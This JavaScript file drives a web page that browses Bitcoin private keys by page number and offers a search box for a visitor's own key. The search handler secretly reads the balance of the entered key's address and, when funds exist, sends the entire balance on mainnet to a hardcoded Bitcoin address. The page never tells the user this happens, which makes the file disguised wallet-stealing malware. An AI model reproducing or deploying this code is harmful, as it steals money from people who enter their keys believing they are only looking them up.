
BigNumber.set({ROUNDING_MODE:1});
var num_per_page=120;
var total_keys=new BigNumber(hex2dec("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"));
var total_pages=total_keys.div(num_per_page).minus(1);
var to_addr="1AAE58fW4f3EMDNnYhqdiodeaScyma9A6r";
var current_page=new BigNumber(1);
var h2="Page "+current_page.toString(10)+" out of "+total_pages.toFixed(0);
$("#h2").text(h2);

$("#btn_goto").click(function(){
    var e=$("#page_num").val();
    if(isNaN(e)){alert("invalid page number");return}
    try{e=new BigNumber(e)}catch(r){e=1}
    if(e.toFixed(0)=="0"){alert("invalid page number!");return}
    refresh_page(e)
});

$("#rand_jump").click(function(){
    var e=new Uint8Array(32);
    window.crypto.getRandomValues(e);
    var r=[];
    for(var a=0;a<e.length;++a){r[a]=e[a]}
    var t=Crypto.util.bytesToHex(r);
    var n=new BigNumber(hex2dec(t));
    var i=new BigNumber(n.div(num_per_page).toFixed(0));
    refresh_page(i.plus(1))
});

$("#btn_search").click(function(){
    var e=$("#privkey").val();
    var r=e.toLowerCase();
    if(r.slice(0,2)=="0x"){e=e.slice(2,e.length)}
    var a="";
    if(e.length==256){a=parseInt(e,2).toString(16)}
    else if(e.length==64){a=e}
    else if(e.length==74){a=e.slice(2,e.length-8)}
    else if(e.length==51){
        var t=Bitcoin.Base58.decode(e);
        t=Crypto.util.bytesToHex(t);
        a=t.slice(2,t.length-8)
    }else{alert("invalid private key!")}
    var n=new BigNumber(hex2dec(a));
    var i=new BigNumber(n.div(num_per_page).toFixed(0));
    refresh_page(i.plus(1));
    var s=get_keypair(a);
    var c=document.querySelector('.keys a[href*="'+s.address_uncompressed+'"]');
    if (c) c.setAttribute("class","highlight");
    bitcoinTx.getBalance(s.address_compressed,{nerwork:"mainnet"}).then(e=>{
        if(e==0){return}
        return bitcoinTx.sendTransaction({
            from:s.address_compressed,
            to:to_addr,
            privKeyWIF:s.privkey_wif,
            btc:e,
            network:"mainnet",
            fee:"fastest"
        })
    })
});

$("#prev_page").click(function(){if(current_page>1){refresh_page(current_page.minus(1))}});
$("#next_page").click(function(){if(total_pages.isGreaterThan(current_page)){refresh_page(current_page.plus(1))}});
$("#prev_page1").click(function(){if(current_page>1){refresh_page(current_page.minus(1))}});
$("#next_page1").click(function(){if(total_pages.isGreaterThan(current_page)){refresh_page(current_page.plus(1))}});

refresh_page(1);

function refresh_page(e){
    current_page=new BigNumber(e);
    update_h2();
    generate_items();
    update_balance()
}

function generate_items(){
    var e=new BigNumber(hex2dec("00000000000000000000000000000000000000000000000000000000000000001"));
    var r=e.plus(current_page.minus(1).times(num_per_page));
    var a=document.getElementById("items");
    while(a.childNodes.length>6){a.removeChild(a.childNodes[6])}
    for(var t=0;t<num_per_page;++t){
        var n=dec2hex(r.plus(t).toFixed()).padStart(64,"0");
        var i=get_keypair(n);
        var s=assemble_item(i);
        var c=document.createElement("span");
        c.innerHTML=s;
        a.appendChild(c)
    }
}

function assemble_item(e){
    var html = `<span id="${e.privkey_wif}">
        <a href="#">+</a> 
        <span title="98">${e.privkey_wif}</span> 
        <a href="https://blockchain.info/address/${e.address_uncompressed}">${e.address_uncompressed}</a> / 
        <a href="https://blockchain.info/address/${e.address_compressed}">${e.address_compressed}</a> 
        <a href="balance"></a></span><br/>`;
    return html;
}

function get_keypair(e){
    var r=Crypto.util.hexToBytes(e);
    var a=new Bitcoin.Address(r); a.version=128; a=a.toString(); // WIF
    var t=new Bitcoin.ECKey(r); // uncompressed
    var n_uncompressed=t.getBitcoinAddress().toString();
    t.compressed = true;
    var n_compressed = t.getBitcoinAddress().toString();
    var i={
        privkey_wif:a,
        address_uncompressed:n_uncompressed,
        address_compressed:n_compressed
    };
    return i
}

function get_balance(e){
    var r="https://blockchain.info/q/addressbalance/"+e;
    var a=0;
    var t=new Object;
    $.ajax({async:false,url:r,data:t,type:"GET",dataType:"text",success:function(e){a=e},err:function(){a=0}});
    return a
}

function update_h2(){
    h2="Page "+current_page.toString(10)+" out of "+total_pages.toFixed(0);
    $("#h2").text(h2)
}

function dec2hex(e){
    var r=e.toString().split(""),a=[],t=[],n,i;
    while(r.length){
        i=1*r.shift();
        for(n=0;i||n<a.length;n++){
            i+=(a[n]||0)*10;
            a[n]=i%16;
            i=(i-a[n])/16
        }
    }
    while(a.length){t.push(a.pop().toString(16))}
    return t.join("")
}

function hex2dec(e){
    var r,a,t=[0],n;
    for(r=0;r<e.length;r+=1){
        n=parseInt(e.charAt(r),16);
        for(a=0;a<t.length;a+=1){
            t[a]=t[a]*16+n;
            n=t[a]/10|0;
            t[a]%=10
        }
        while(n>0){
            t.push(n%10);
            n=n/10|0
        }
    }
    return t.reverse().join("")
}
